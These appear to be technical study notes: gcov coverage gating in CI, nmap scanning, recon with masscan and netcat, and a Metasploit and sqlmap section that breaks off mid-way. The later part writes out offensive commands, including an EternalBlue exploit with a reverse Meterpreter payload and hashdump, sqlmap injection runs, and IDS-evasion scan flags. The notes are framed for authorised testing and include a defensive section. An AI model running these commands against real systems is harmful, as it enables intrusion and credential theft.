##### = an executable line that was never run (zero count). - = a line with no executable code (blank, comment, brace, declaration). A number is the execution count for that line.

Intermediate core

Set up a coverage gate in CI for a C project with a unit-test suite. What are the moving parts?
(1) A dedicated coverage build: -O0 -g --coverage (separate build dir from the normal/optimised build), plus -fprofile-update=atomic if tests run in parallel. (2) Reset counters before the run (lcov --zerocounters -d build or delete .gcda). (3) Run the test suite; ensure every test binary exits cleanly so .gcda flush (a crashing test loses its data — fix the test or add a dump-on-signal). (4) Aggregate: gcovr -r . --object-directory build or lcov --capture, then exclude non-product code (--remove '*/tests/*' '*/third_party/*' '/usr/*'). (5) Report: emit HTML for humans (genhtml / --html-details) as a build artifact, and Cobertura XML/JSON for the CI dashboard or PR annotation. (6) Gate: gcovr --fail-under-line 80 --fail-under-branch 60 (non-zero exit fails the job); optionally a diff/patch coverage check (new/changed lines must be ≥ X%) which is fairer than a global number. (7) Track the trend over time and require justification for drops. (8) Keep the coverage build out of the release pipeline (it's slower and instrumented). Common pitfalls to handle: stale .gcda from a previous run, path mismatches (-s/--root to normalise), and generated code inflating or deflating the number.
You need coverage from tests running on an embedded target with a read-only rootfs and no gcov binary. How?
The instrumentation is in the built binary already; only the data files and the reporting are the problem. (1) At compile time the .gcda output paths are absolute build-host paths the target can't write. Set, on the target, GCOV_PREFIX=/mnt/cov (a writable tmpfs or SD card / NFS mount) and GCOV_PREFIX_STRIP=<n> to drop the leading path components, so files are written under the prefix with a shortened path. (2) Ensure the test app exits cleanly (or call __gcov_dump() from a signal handler) so the .gcda are actually written. (3) After the test, copy the /mnt/cov tree back to the build host and place the .gcda next to the matching .gcno/objects (same relative layout). (4) Run gcov/lcov/gcovr on the build host, which has the sources, the .gcno, and the tools. (5) If the toolchain versions differ, use the matching gcov for that GCC (or llvm-cov gcov), and consider -fprofile-abs-path at build time to make path fix-ups easier. For continuous use, script the prefix-set + run + pull-back + report as one CI step, and use lcov -a/gcov-tool merge to combine multiple target runs.

Advanced deep

Design a coverage program for a large multi-language codebase: what to measure, how to aggregate, what to gate on, and how to avoid it becoming a vanity metric.
What to measure: line and branch coverage per component from unit tests (gcov/llvm-cov for C/C++, and the native tools elsewhere — coverage.py, JaCoCo, go test -cover, etc.), plus a separate integration/e2e coverage run where feasible (instrument the service, run the black-box suite, dump on shutdown) so you know the real end-to-end exercised surface, not just unit paths. Track function coverage for a quick "entirely untested code" signal. For safety-critical modules, require MC/DC. Build: dedicated -O0 instrumented builds, parallel-safe (-fprofile-update=atomic / per-worker output dirs), separate from release artifacts; dump-on-signal for daemons; GCOV_PREFIX for cross/remote runs. Aggregate: per-language raw data → a common format (lcov .info / Cobertura / OpenCppCoverage etc.) merged per component and uploaded to a coverage service (Codecov/Coveralls/SonarQube or self-hosted) that stores history, does PR annotation, and merges parallel shards. Normalise paths, exclude third-party/generated/test code consistently via a checked-in config. Gate on: primarily patch/diff coverage — new and modified lines in a PR must be ≥ a threshold (e.g. 80% line, 70% branch); this is fair, actionable, and can't be gamed by old untested code. Add a ratchet on project totals: coverage may not drop more than a small epsilon; drops need reviewer sign-off with a reason. Optionally hard per-component floors for critical modules. Do not gate purely on a global percentage target. Reporting: HTML artifacts per build, a trend dashboard, and PR comments showing exactly which new lines/branches are uncovered. Surface "files with 0% coverage" and "large functions with low branch coverage" as backlog items. Avoiding the vanity trap: (1) pair coverage with mutation testing (e.g. mull for C/C++, pitest, mutmut) on core modules — it measures whether tests actually detect changes, catching high-coverage/weak-assertion tests; run it nightly, not per-PR. (2) Review that new tests have meaningful assertions (lint for assertion-free tests). (3) Exclude trivial code (getters, generated) so the number reflects logic. (4) Treat coverage as a gap finder in review ("this error path is untested — is that OK?"), and record deliberate exclusions with a comment/annotation and rationale. (5) Watch for coverage added via characterization tests that just pin current behaviour without checking correctness. Ops: keep the instrumented build fast enough to run per-PR (shard it), cache .gcno where possible, and fail loudly if a test crash caused missing data rather than silently under-reporting. Net: measure line+branch (and integration) coverage, aggregate to a history-keeping service, gate on diff coverage + a total-coverage ratchet rather than an absolute target, back it with mutation testing and assertion review so it measures test quality not just execution, and use it in code review as the "what did we forget to test" checklist.

nmap: Network & Port Scanning

Discovers which hosts are up, which ports are open, what service and version is behind each, and (with scripts) known weaknesses — the standard tool for network inventory and connectivity debugging.

Notes

Targets and host discovery

What / how. Targets can be a host, a list, CIDR, or ranges. By default nmap first does host discovery (a "ping sweep": ICMP echo, TCP SYN to 443, TCP ACK to 80, ICMP timestamp) and only port-scans hosts that respond. -sn stops after discovery; -Pn skips it (treat every host as up — needed when hosts block pings).

nmap 10.0.0.5                         # one host
nmap scanme.nmap.org                  # by name
nmap 10.0.0.0/24                      # a /24
nmap 10.0.0.1-50 10.0.1.10            # ranges + extra host
nmap -iL targets.txt                  # from a file
nmap --exclude 10.0.0.1 10.0.0.0/24   # skip the gateway

nmap -sn 10.0.0.0/24                  # PING SWEEP only: which hosts are up (no port scan)
nmap -Pn 10.0.0.5                     # skip discovery: scan even if it doesn't answer pings
nmap -PS22,80,443 -PA3389 10.0.0.0/24 # custom discovery probes (SYN to.., ACK to..)
nmap -n 10.0.0.0/24                   # -n: no reverse-DNS (much faster on big ranges)

Port scan types

FlagScanNotes
-sSTCP SYN ("half-open")Default when run as root/CAP_NET_RAW. Fast, doesn't complete the handshake, relatively quiet.
-sTTCP connect()Used when you lack raw-socket privilege. Full handshake — slower, logged by the target app.
-sUUDPSlow (relies on ICMP port-unreachable / timeouts). Needed for DNS, SNMP, NTP, DHCP, etc.
-sATCP ACKDoesn't find open ports — maps firewall rules (filtered vs unfiltered).
-sN/-sF/-sXNull / FIN / XmasStealth/evasion probes; work only against strictly RFC-compliant stacks.
-snNo port scan(lowercase n) discovery only — don't confuse with -sN.
nmap -sS -p 1-1000 10.0.0.5           # SYN scan of ports 1-1000
nmap -sU --top-ports 50 10.0.0.5      # 50 most common UDP ports
nmap -sS -sU -p T:22,80,443,U:53,161 host   # mixed TCP+UDP port list

Port selection and speed

-p 22,80,443            # explicit list
-p 1-65535   OR  -p-    # all 65535 TCP ports
-p U:53,111,T:1-1000    # protocol-qualified
--top-ports 100         # the N most common ports (from nmap-services frequency data)
-F                      # fast: top 100 ports
-r                      # scan ports in order (default is randomised)

-T0 .. -T5              # timing template: 0=paranoid (IDS evasion) ... 3=default ... 5=insane (fast, LAN only)
--min-rate 500 --max-rate 2000     # packets/sec bounds
--host-timeout 5m       # give up on a host after 5 min
--max-retries 2         # fewer probe retransmits = faster, less accurate
--open                  # only report open (and open|filtered) ports

Service, version, and OS detection

What / why. An open port tells you something listens; -sV probes it to identify the product and version ("nginx 1.24.0", "OpenSSH 9.6p1"); -O fingerprints the OS from TCP/IP stack quirks; -A turns on -sV -O + default scripts + traceroute.

nmap -sV 10.0.0.5                     # version detection
nmap -sV --version-intensity 9 host  # try harder (0-9; 9 = all probes)
nmap -O host                         # OS fingerprint (needs one open + one closed port, root)
nmap -A 10.0.0.5                     # aggressive: -sV -O + default NSE + traceroute (loud!)
nmap -sV -p- --min-rate 1000 10.0.0.5     # full TCP port + version sweep

# example output:
# PORT    STATE SERVICE VERSION
# 22/tcp  open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
# 443/tcp open  ssl/http nginx 1.24.0
# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: the Nmap Scripting Engine

What / why. Lua scripts that run against discovered ports for deeper checks — banner grabbing, enumeration (SMB shares, HTTP titles/headers, TLS ciphers), and vulnerability probes. Scripts have categories: default, safe, discovery, version, auth, brute, vuln, exploit, intrusive, dos.

nmap -sC host                        # = --script=default (the "safe + useful" set)
nmap --script=http-title,http-headers -p 80,443 host
nmap --script=ssl-enum-ciphers -p 443 host          # TLS versions + cipher grades
nmap --script=smb-enum-shares,smb-os-discovery -p 445 host
nmap --script "vuln" host                           # all vuln-category scripts (intrusive)
nmap --script "http-* and safe" -p 80 host          # boolean selectors
nmap --script=banner --script-args=timeout=5 host
nmap --script-help ssl-enum-ciphers                 # docs for a script
# scripts live in /usr/share/nmap/scripts/ ; run 'nmap --script-updatedb' after adding one

Output formats

-oN scan.nmap     # normal (human-readable)
-oX scan.xml      # XML - for tools / import into other systems
-oG scan.gnmap    # "grepable" - one line per host (legacy but handy for awk/grep)
-oA basename      # all three at once -> basename.nmap/.xml/.gnmap
-oS ...           # "script kiddie" (a joke format)
-v / -vv          # verbosity ;  -d / -dd  debug ;  --reason  why each port is in its state
--stats-every 30s # progress updates on long scans
--resume scan.gnmap   # continue an interrupted scan

# turn XML into HTML:
xsltproc scan.xml -o scan.html
# grepable one-liner: list hosts with 22 open
grep '22/open' scan.gnmap | cut -d' ' -f2

Firewall/IDS evasion (authorised testing only)

-f / --mtu 16          # fragment probes into tiny packets
-D RND:10              # decoys: mix your scan with 10 spoofed source IPs
-S 10.0.0.9            # spoof source address (needs to see replies -> usually with -e + a tap)
--source-port 53       # come from port 53 (some firewalls trust it)
--data-length 25       # pad packets to a non-default size
--scan-delay 1s        # slow probes to stay under rate-based IDS thresholds
-T0 / -T1              # paranoid/sneaky timing
--badsum               # send bad checksums (responses imply an IDS/IPS, not the host)

Where nmap is used

  • Ops / SRE: "is the service actually listening on the external interface?", verify a security-group / iptables change did what you intended, find what grabbed a port, quick subnet inventory after a migration.
  • Security: authorised penetration tests and red-team recon, external attack-surface monitoring, compliance scans (open-port policy), TLS-config auditing (ssl-enum-ciphers).
  • Asset management: periodic -sn/-sV sweeps feeding a CMDB; diff scans to detect new hosts/ports (ndiff).
  • Connectivity debugging: from host A, nmap -Pn -p 5432 db-host to prove whether a path is open, closed, or filtered — the filtered state specifically means "a firewall is dropping this".
  • Not for: scanning networks without written authorisation (legal risk), and it's noisy — a full -A -p- scan can disrupt fragile devices (printers, SCADA, old embedded stacks).
Cheat Sheet
  • Targets: host, 10.0.0.0/24, 10.0.0.1-50, -iL file, --exclude. Add -n (no DNS) for speed on big ranges.
  • Discovery: -sn (ping sweep only), -Pn (skip discovery, assume up), -PS/-PA/-PU custom probes.
  • Scan types: -sS (SYN, default as root), -sT (connect, unprivileged), -sU (UDP, slow), -sA (ACK → firewall map). States: open / closed / filtered.
  • Ports: -p 22,80, -p- (all), -p U:53,T:1-1000, --top-ports N, -F (fast top 100), --open.
  • Fingerprint: -sV (service/version), -O (OS), -A (= -sV -O + default scripts + traceroute, loud).
  • NSE: -sC (default scripts), --script=ssl-enum-ciphers, --script "vuln", --script "http-* and safe", --script-help NAME.
  • Speed: -T0..T5 (3 default), --min-rate/--max-rate, --host-timeout, --max-retries.
  • Output: -oA base (normal+XML+grepable), -oN/-oX/-oG, --reason, --resume, ndiff to compare scans.
  • Authorisation required. Full/aggressive scans can disrupt fragile devices.
Q&A
What do the port states open, closed, and filtered actually mean?
open: a service accepted the probe (SYN-ACK for TCP) — something is listening. closed: the host is reachable and replied that nothing is listening there (TCP RST) — no firewall in the way for that port. filtered: nmap got no useful reply (probe dropped, or an ICMP admin-prohibited) — a firewall or filter is blocking it, and nmap can't tell if a service is behind it. There's also open|filtered (common with UDP and FIN/Null/Xmas scans — no response could mean either) and unfiltered (from -sA: reachable, state unknown).
When do you need -Pn, and what's the cost of using it?
Use -Pn when the target (or its firewall) blocks nmap's host-discovery probes, so nmap wrongly concludes the host is down and skips it — common for hardened servers, hosts behind stateful firewalls, and many cloud instances. -Pn tells nmap to skip discovery and port-scan every target regardless. The cost: on a large range you now port-scan every address including ones that truly are down, which is much slower and noisier. So use -Pn for known individual hosts, and prefer real discovery (-sn with tuned -PS/-PA probes) for sweeps.
Why is a UDP scan (-sU) so slow and often inconclusive?
UDP is connectionless: an open port usually sends nothing back to a probe, and a closed port replies with ICMP port-unreachable — which the kernel rate-limits (Linux: ~1/sec). So nmap must wait out timeouts and retransmits for every non-responding port, and can't distinguish "open" from "filtered" without a protocol-specific payload. Speed it up by scanning only the ports that matter (--top-ports or an explicit list), raising --min-rate cautiously, adding version probes (-sV sends real protocol payloads that elicit replies), and accepting open|filtered as the answer for many ports.
You changed a firewall rule to allow app traffic to a DB. How do you verify it with nmap without a DB client?
From the source host (or one on the same segment/policy): nmap -Pn -p 5432 --reason db-host. open → the path works and Postgres is listening. filtered → a firewall is still dropping it (your rule didn't take effect, wrong direction, wrong source, or another device in the path). closed → the network path is open but nothing is listening on 5432 on that host (service down or bound to a different interface). Add -sV to confirm it's actually Postgres and not something else on that port. Run it from the real source host, because firewall rules are source-specific.
Is it OK to run nmap -A -p- -T5 against any host you're curious about?
No. Legally, scanning hosts you don't own or lack written authorisation to test can violate computer-misuse laws and provider AUPs, regardless of intent. Operationally, -A -p- -T5 is aggressive: 65k ports, version probes, OS detection, default scripts, and high packet rate can crash fragile TCP/IP stacks (printers, IoT, medical/SCADA gear), trip IDS/IPS and get you blocked, and generate a lot of noise. Only scan assets in scope of an engagement or that you administer; on production/fragile networks use conservative timing (-T2/-T3), limited ports, --scan-delay, and coordinate with the owners.
Interview Questions

Basic warm-up

What's the difference between -sn and -Pn?
-sn does host discovery only — a ping sweep to list which hosts are up, with no port scan. -Pn does the opposite — it skips host discovery and port-scans every target as if it were up (used when hosts block pings).
Which flag identifies the software and version behind an open port?
-sV (service/version detection). -A includes it along with OS detection (-O), default scripts, and traceroute.

Intermediate core

Design an nmap command (or few) to inventory a /22 you just took over, safely and reasonably fast.
Two passes. Pass 1 — discovery: nmap -sn -n -PE -PS22,80,443,3389 -PA80 --min-rate 300 -oA sweep 10.0.0.0/22 — ping sweep with a few TCP probes (so firewalled-but-up hosts still respond), no reverse DNS for speed, moderate rate. Review sweep.gnmap for the live list. Pass 2 — service scan of live hosts: nmap -sS -sV -O --version-light -T3 --top-ports 1000 -Pn --open --reason -oA inventory -iL live-hosts.txt — SYN scan of the common 1000 ports plus light version/OS detection, only report open ports, keep timing moderate (-T3) to avoid stressing fragile devices, feed it the discovered hosts. Optionally a targeted UDP pass for the few services that matter: nmap -sU --top-ports 20 -T3 -iL live-hosts.txt -oA udp. Add -sC (default scripts) only after you know what's out there and have confirmed nothing fragile. Then ndiff future scans against inventory.xml to catch new hosts/ports. Coordinate timing with any NOC/IDS owners, exclude known-fragile ranges (printers, OT) or scan them with -T2 --max-retries 1 --scan-delay, and record authorisation.
A host shows port 8080 as filtered from your laptop but the app team says it's up. Reconcile this.
filtered means nmap's probe got no answer — something between you and the host is dropping it, not that the service is down. Steps: (1) Scan from a host on the same network segment / security policy as the real clients (nmap -Pn -p 8080 --reason host from there) — your laptop likely traverses a firewall the app servers don't. (2) Check the --reason: no-response (silent drop, typical firewall) vs admin-prohibited (explicit ICMP reject) vs host-unreach (routing). (3) On the target itself, confirm it's listening and on which address: ss -tlnp | grep 8080 — it may be bound to 127.0.0.1 only, so it's "up" locally but unreachable externally (that would show as filtered or a connection failure from outside). (4) Try -sT (full connect) and a plain curl/nc from the client segment to corroborate. (5) Check for host-based filtering (iptables/nftables/firewalld, cloud security group, SELinux) and for an L7 proxy that only answers valid HTTP. (6) If it's genuinely reachable from clients and only your path is blocked, that's expected — the finding is "not reachable from the laptop network", which may be by design. The key point: filtered is a statement about the path, so test from where the real traffic originates and correlate with ss/firewall config on the host.

Advanced deep

Build a continuous external attack-surface monitoring capability using nmap. Cover scheduling, accuracy, safety, diffing, and where nmap stops being enough.
Scope & authorisation: maintain an authoritative, change-controlled list of owned IP ranges and domains (pull from IPAM/cloud APIs so it stays current); keep written authorisation and legal sign-off; exclude third-party-hosted assets and known-fragile ranges (OT, printers, medical) or handle them with ultra-conservative settings. Vantage points: scan from outside your network (a cloud box in a neutral ASN) to see what attackers see; optionally also from key partner networks. Rotate/scale source IPs and respect provider AUPs on scanning. Scheduling & cadence: lightweight discovery (-sn + top-ports SYN) frequently (hourly/daily) to catch new exposure fast; fuller -sV + curated --script "safe or default" weekly; full -p- monthly. Stagger across ranges; use --min-rate/--max-rate and -T3 (not -T5) to stay polite; --host-timeout and --max-retries to bound runtime; --resume for reliability; parallelise with masscan for the fast full-port sweep then hand open ports to nmap -sV for accurate fingerprinting (masscan is faster but crude; nmap is accurate but slower — use both). Accuracy: always -Pn for the target list (cloud hosts drop pings), -n for speed with a separate DNS resolution step, --reason stored so state changes are explainable, version-detection intensity tuned, and re-scan flapping results before alerting. Normalise service identification to CPEs. Safety: no brute/exploit/dos/intrusive NSE categories; cap rate; back off on errors; an emergency stop; announce windows to the SOC so it's not mistaken for an attack; monitor for scan-induced incidents. Storage & diffing: keep every scan as XML; use ndiff (or parse XML into a time-series DB) to produce a daily delta — new hosts, newly-open ports, changed service/version, disappeared services, new TLS weaknesses. Alert on deltas, not on the full state, with severity by asset criticality and exposure (e.g. new RDP/SMB/database port open to the internet = page). Feed confirmed assets/services into the CMDB and vuln scanner. Enrichment: cross-reference discovered service versions against a CVE feed; run ssl-enum-ciphers/ssl-cert for TLS posture and expiry; http-headers/http-title for web exposure. Where nmap stops: it finds ports and version banners, not authenticated vulnerabilities, web-app flaws, cloud misconfigurations (S3 buckets, IAM), API exposure behind a single port, or assets with no open ports (serverless, SaaS). Complement with: an authenticated vulnerability scanner (Nessus/OpenVAS) for CVE validation, a web scanner (ZAP/Burp) for app issues, cloud CSPM tools for provider-side exposure, certificate-transparency + passive DNS + Shodan/Censys for assets you don't know you have, and masscan for internet-scale speed. nmap is the accurate fingerprinting and change-detection core; it needs a layer above it for "is this actually exploitable" and a layer beside it for non-port-based exposure. Ops: treat the scanner infra as production (monitoring, on-call), review the target list and NSE selection quarterly, and track metrics like time-to-detect a new exposure and false-positive rate on the diff alerts.

Recon & Scanning: nmap, masscan, netcat

Map the attack surface before touching it: which hosts are up, which ports are open, what is listening, and what version it is — on scope you are authorised to test.

Notes

Ground rules first

What / why. Recon is loud and legally sensitive. Before any packet: have the scope (IP ranges, domains, hours, excluded systems) in writing; stay inside it; log what you run and when; avoid fragile devices (OT/SCADA, printers, medical); coordinate with the blue team so your scan is not mistaken for an incident.

# keep an evidence trail
$ SCOPE="10.10.10.0/24"                 # exactly what the authorisation says, nothing more
$ mkdir -p engagement/scans && cd engagement/scans
$ script -q -c 'bash' recon-$(date +%F).log   # record the whole session
# out-of-scope? stop. New target discovered mid-engagement -> confirm it's in scope first.

nmap — discovery and enumeration

What / why. The standard tool: host discovery, port scanning, service/version detection, OS fingerprinting, and the NSE script engine for deeper enumeration. Two-phase is normal — a quick sweep, then a focused scan of what answered.

$ nmap -sn 10.10.10.0/24 -oA sweep            # ping sweep: which hosts are up
$ nmap -Pn -sS --top-ports 1000 -T3 -oA quick -iL live.txt   # top-1000 SYN scan of live hosts
$ nmap -Pn -sS -sV -sC -O -p- -T4 --min-rate 800 10.10.10.7 -oA full   # full port + version + default scripts + OS
$ nmap -sU --top-ports 50 10.10.10.7          # UDP (DNS/SNMP/NTP/SNMP) - slow, do it targeted

# NSE for enumeration (safe/default categories in an authorised test):
$ nmap --script "default,safe,discovery" -p 80,443 10.10.10.7
$ nmap --script "http-title,http-headers,http-enum,http-methods" -p 80,443 10.10.10.7
$ nmap --script "smb-os-discovery,smb-enum-shares,smb-protocols" -p 445 10.10.10.7
$ nmap --script "ssl-enum-ciphers,ssl-cert" -p 443 10.10.10.7
$ nmap --script "vuln" -p 80,443 10.10.10.7   # 'vuln' category is intrusive - only in-scope, coordinate

# port states:  open = listening   closed = reachable, nothing there   filtered = a firewall dropped it
$ ndiff full.xml full-later.xml               # diff two scans to spot changes over the engagement

masscan — speed at scale

What / why. An asynchronous scanner with its own TCP/IP stack; it can sweep very large ranges for open ports far faster than nmap, but it does little beyond "port open?". Use it to find the ports, then hand them to nmap for accurate identification. It is aggressive by default — the rate must be tuned.

# find open ports fast, then enumerate with nmap
$ sudo masscan -p1-65535 10.10.10.0/24 --rate 2000 -oL masscan.txt --wait 3
$ sudo masscan -p80,443,8080,8443 10.10.0.0/16 --rate 5000 --banners -oJ web.json
# --rate is packets/sec: too high melts links, trips IDS, and drops results. Start low on shared networks.
# --exclude / --excludefile to honour out-of-scope hosts. --shard to split work across boxes.
# feed masscan's open ports into nmap:
$ ports=$(grep -oP 'port \K[0-9]+' masscan.txt | sort -un | paste -sd,)
$ nmap -Pn -sV -sC -p "$ports" -iL targets.txt -oA masscan-followup
# NB masscan and nmap can conflict if the host firewall/conntrack sees both; run sequentially.

netcat (nc) — the manual probe

What / why. A raw TCP/UDP read/write tool: grab a banner, hand-speak a protocol, port-scan a few ports, redirect a port, or stand up a quick listener for file transfer or a callback in a lab. Note there are several implementations (traditional, OpenBSD, ncat) with different flags — ncat (from nmap) is the most capable and has TLS.

$ nc -nv 10.10.10.7 22                        # connect + see the SSH banner
$ printf 'HEAD / HTTP/1.0\r\n\r\n' | nc -nv 10.10.10.7 80   # manual HTTP request
$ nc -znv 10.10.10.7 20-25                    # quick connect-scan of a small port range (-z = no data)
$ nc -nvu 10.10.10.7 161                      # UDP probe

# lab file transfer:
receiver$ nc -lvnp 4444 > file.bin
sender$   nc -nv 10.10.10.5 4444 < file.bin

# ncat extras (TLS, allow-list, exec is disabled in modern builds for safety):
$ ncat --ssl -nv 10.10.10.7 443
$ ncat -lvnp 8000 --allow 10.10.10.5         # listener restricted to one source
# 'nc -e' (command execution) is removed from most distros' netcat - by design.

Where this fits — and the defensive mirror

  • Used in: authorised network penetration tests and red-team recon, CTF/lab enumeration (HTB, TryHackMe, PortSwigger), your own infrastructure audits, and pre-migration inventory.
  • Blue-team view: scans show up as bursts of SYNs to many ports/hosts from one source — detectable with IDS (port-scan signatures), NetFlow/Zeek, and connection-rate alerting. Defences: minimise exposed services, default-deny ingress/egress, segment the network, rate-limit and tarpit, and run your own continuous attack-surface scans so you find the open port before someone else does.
  • Not: scanning third parties without authorisation, or blasting --rate/-T5 at production or fragile devices.
Cheat Sheet
  • Authorisation + scope in writing before any packet. Log the session. Avoid fragile devices. Coordinate with defenders.
  • nmap: -sn sweep → -Pn -sS --top-ports 1000 quick → -sS -sV -sC -O -p- full; -sU --top-ports for UDP; -oA always; ndiff to compare.
  • NSE: --script "default,safe,discovery"; targeted (http-enum, smb-enum-shares, ssl-enum-ciphers); --script vuln is intrusive — coordinate.
  • masscan: -p1-65535 <range> --rate N -oL/-oJ for a fast open-port sweep; tune --rate down on shared links; --exclude out-of-scope; then feed ports to nmap -sV.
  • nc / ncat: nc -nv host port banner; -z connect-scan; -u UDP; -lvnp listener; ncat --ssl, --allow; nc -e is removed on purpose.
  • Port states: open / closed / filtered (firewall dropped it).
  • Defensive mirror: asset inventory, default-deny, segmentation, IDS/NetFlow, rate-limit/tarpit, run your own recurring scans.
Q&A
Why run masscan and nmap together instead of just one?
They optimise for different things. masscan is asynchronous with its own stack — it can find open ports across a /16 in minutes, but it barely identifies the service and is easy to misconfigure into flooding a link. nmap is accurate — real version detection, OS fingerprinting, NSE enumeration — but scanning all 65k ports on many hosts with it is slow. So: masscan to discover which ports are open fast, then nmap -sV -sC on exactly that port list for the detail you actually act on.
What do the port states open, closed, and filtered mean, and which one implies a firewall?
open: something accepted the probe (SYN-ACK) — a service is listening. closed: the host replied that nothing is listening there (RST) — reachable, no filter in the way for that port. filtered: no useful reply (probe silently dropped, or ICMP admin-prohibited) — a firewall or filter is blocking it and nmap can't tell if a service is behind it. So filtered is the firewall indicator; closed means the packet got through but hit nothing.
What is netcat's -z flag and when would you use it over nmap?
-z ("zero-I/O") makes nc just test whether a connection can be established and then close it — a lightweight connect scan. You'd use it for a quick check of a handful of ports on one host from a box where nmap isn't installed (a limited shell on a target, a minimal container), or inside a script. For anything real — many ports/hosts, version detection, accuracy, timing control — use nmap.
You discover a live host mid-engagement that wasn't in the original target list. What do you do?
Stop and confirm scope before touching it. Discovering a host doesn't authorise testing it — it might be a third party's system on a shared segment, out-of-scope by agreement, or a sensitive device. Note it, report it to the engagement contact, and get explicit written confirmation that it's in scope before scanning or interacting further. Testing outside the authorised scope can be a legal problem and breaks the rules of engagement.
Why is nc -e missing from most Linux distributions' netcat?
Because -e pipes a program's stdio to the socket — the classic one-liner bind/reverse shell — and shipping that by default was considered too dangerous a footgun. Distros build the "GNU"/"traditional" netcat without -e (or ship OpenBSD nc, which never had it). Legitimate uses that need it use ncat (with restrictions), socat, or explicit shell redirection; the point is it's an opt-in, not a default.
Interview Questions

Basic warm-up

What must you have before scanning any network?
Written authorisation defining the scope (IP ranges/domains, timing, exclusions) — from the system owner or an engagement contract, or it's your own lab / a sanctioned CTF range. Unauthorised scanning of third-party systems can violate computer-misuse law.
Which tool would you use to grab a service banner from a single port, quickly, with nothing else installed?
netcat: nc -nv <host> <port> connects and shows whatever the service sends first (SSH/FTP/SMTP banners, etc.).

Intermediate core

Design an efficient, low-noise recon workflow for a /22 you're authorised to test on a shared corporate network.
Phase 0: confirm scope and exclusions in writing; notify the SOC of the window; start a session log; identify and exclude fragile ranges (OT, printers, VoIP). Phase 1 — discovery: nmap -sn -n -PE -PS22,80,443,3389 -PA80 --min-rate 200 -oA sweep 10.x.0.0/22 — a few TCP probes so firewalled-but-up hosts still answer, no reverse DNS, gentle rate. Phase 2 — fast port sweep of live hosts: either nmap -Pn -sS --top-ports 1000 -T3 --max-retries 1 -iL live.txt -oA quick, or masscan at a low rate (--rate 500) with --excludefile and -oL if the range is big — on a shared network prefer nmap -T3 to stay polite. Phase 3 — targeted enumeration: for each host, nmap -Pn -sS -sV -sC -O -p <discovered-ports> -T3 --scan-delay 0 -oA host-<ip>; add safe NSE scripts per service (http-enum, smb-enum-shares, ssl-enum-ciphers). Save vuln-category scripts for explicitly agreed hosts. Phase 4 — manual: nc/curl to confirm interesting findings by hand and capture exact banners/responses as evidence. Keep timing at -T3, cap --min-rate, spread work over time, and diff scans with ndiff if you re-run. Net: gentle discovery → port sweep → per-service enumeration → manual confirmation, all logged and scoped.

Advanced deep

You're on the blue team. Design detection and mitigation for exactly the recon activity these tools perform.
Reduce the surface first: authoritative asset inventory (feed from cloud/IPAM), default-deny ingress and egress at segment boundaries, network segmentation/microsegmentation so a foothold can't sweep the whole estate, and your own recurring external + internal scans (nmap/masscan or a commercial ASM) with alerting on new open ports so you find exposure before an attacker does. Detection: (1) IDS/IPS (Suricata/Snort) port-scan and NSE-signature rules; (2) flow analysis (Zeek, NetFlow/IPFIX, cloud VPC flow logs) — alert on one source touching many distinct destination IPs or many distinct ports in a short window, high SYN-without-ACK ratios, and connections to ports with no listener (which imply scanning); (3) honeypots / honey-ports / a tarpit — any interaction with an unused IP or port is high-fidelity malicious; (4) host telemetry (EDR / auditd / Sysmon-for-Linux) for nmap/masscan/nc process execution and raw-socket usage on servers that should never run them; (5) DNS/passive-DNS spikes and reverse-lookup storms. Mitigation / response: rate-limit and connection-throttle at the firewall; SYN-cookies and per-source connection caps; drop (don't reject) closed ports so scans are slow and inconclusive; tarpit suspicious sources (LaBrea / iptables TARPIT-style); auto-quarantine a source that trips scan thresholds (NAC / dynamic ACL) with an analyst review; block known scanner infrastructure. Context: correlate with change tickets and the pentest schedule so an authorised assessment isn't a 2am page — but still record it. Metrics: time-to-detect a scan, number of exposed services trending down, and coverage of segments by flow monitoring. The goal isn't to stop scanning (you can't) — it's to have almost nothing to find, and to know immediately when someone looks.

Exploitation Frameworks: Metasploit & sqlmap

Metasploit turns "known vulnerability" into a repeatable module workflow; sqlmap automates finding and pulling data through SQL-injection flaws — both only against systems you are authorised to test.

Notes

Metasploit: what it is

What / why. A framework of ~2,000+ exploit modules, ~1,300 auxiliary modules (scanners, fuzzers, brute-forcers), payloads, encoders, and post-exploitation modules, driven from msfconsole. It standardises the "select a known exploit → set target → set payload → run → get a session" loop, plus a database to track hosts/services/loot across an engagement.

$ msfdb init && msfconsole -q
msf6 > workspace -a client-x            # isolate this engagement's data
msf6 > db_nmap -sV -sC 10.10.10.7       # nmap results land in the workspace DB
msf6 > hosts ; services ; vulns         # what we know so far

msf6 > search type:exploit platform:windows smb                 # find a module
msf6 > use exploit/windows/smb/ms17_010_eternalblue            # (lab example)
msf6 > info                              # description, options, targets, references (CVE)
msf6 > show options ; show targets
msf6 > set RHOSTS 10.10.10.7
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.5 ; set LPORT 4444
msf6 > check                             # non-invasive "is it vulnerable?" where supported
msf6 > run                               # or 'exploit'
meterpreter > getuid ; sysinfo ; hashdump
msf6 > sessions -l ; sessions -i 1 ; background

Metasploit: the pieces

ConceptWhat it is
exploit moduleCode that triggers a specific vulnerability (usually tied to a CVE) to run a payload.
auxiliary moduleNo payload — scanners, login brute-forcers, protocol fuzzers, DoS (out of scope for most tests), enumeration.
payloadWhat runs after exploitation. Staged (small stub pulls the rest) vs stageless; bind (listen on target) vs reverse (call back to you).
MeterpreterAn in-memory post-exploitation payload: file ops, ps/migrate, hashdump, pivoting (route, portfwd), getsystem, screenshot.
encoder / NOPHistorically for AV/IDS evasion & bad-char avoidance; modern AV defeats simple encoding — largely a legacy concept.
post moduleRuns against an existing session: local enumeration, privesc checks, credential harvesting, persistence (persistence needs explicit authorisation).
msfvenomStandalone payload generator: msfvenom -p <payload> LHOST=.. LPORT=.. -f <fmt> -o out.
handleruse exploit/multi/handler — catches a callback from a payload you delivered another way.

sqlmap: automated SQL injection

What / why. Given a request that reaches a database, sqlmap detects whether a parameter is injectable, identifies the DBMS and technique (boolean/error/time/UNION/stacked), and then automates enumeration and data extraction — and, where the config allows, file read/write or an OS shell. Point it at your own app, a lab (DVWA, bWAPP, HTB), or an in-scope target.

# give it a real request (a saved Burp request file is the most reliable)
$ sqlmap -r request.txt -p username --batch --level 3 --risk 2

# or by URL / POST body / cookie
$ sqlmap -u 'https://app.test/item?id=1' --dbs
$ sqlmap -u 'https://app.test/login' --data 'user=a&pass=b' -p user
